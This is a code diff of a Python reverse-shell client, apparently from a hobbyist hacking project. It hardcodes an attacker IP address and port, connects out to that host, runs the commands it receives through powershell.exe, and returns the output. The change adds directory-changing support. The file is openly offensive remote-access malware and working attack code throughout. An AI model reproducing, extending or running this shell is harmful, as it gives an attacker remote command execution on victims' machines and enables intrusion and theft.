@@ -1,8 +1,9 @@
 from os import times
+import os
 import socket
 import subprocess
 
-hacker_IP = input("Enter the IP address of attacker")
+hacker_IP = '192.168.43.138'
 hacker_PORT = 8008
 IDENTIFIER = "<END_OF_COMMAND_RESULT>"
 
@@ -16,6 +17,13 @@ while True:
             hacker_command = data.decode()
             if hacker_command == "stop":
                 break
+            elif hacker_command.startswith("cd"):
+                path2move = hacker_command.strip("cd ")
+                if os.path.exists(path2move):
+                    os.chdir(path2move)
+                else:
+                    print("Cant change the path: ",path2move)
+                    continue
             else:
                 output = subprocess.run(["powershell.exe",hacker_command],shell = True,capture_output = True)
                 if output.stderr.decode("utf-8") == "":
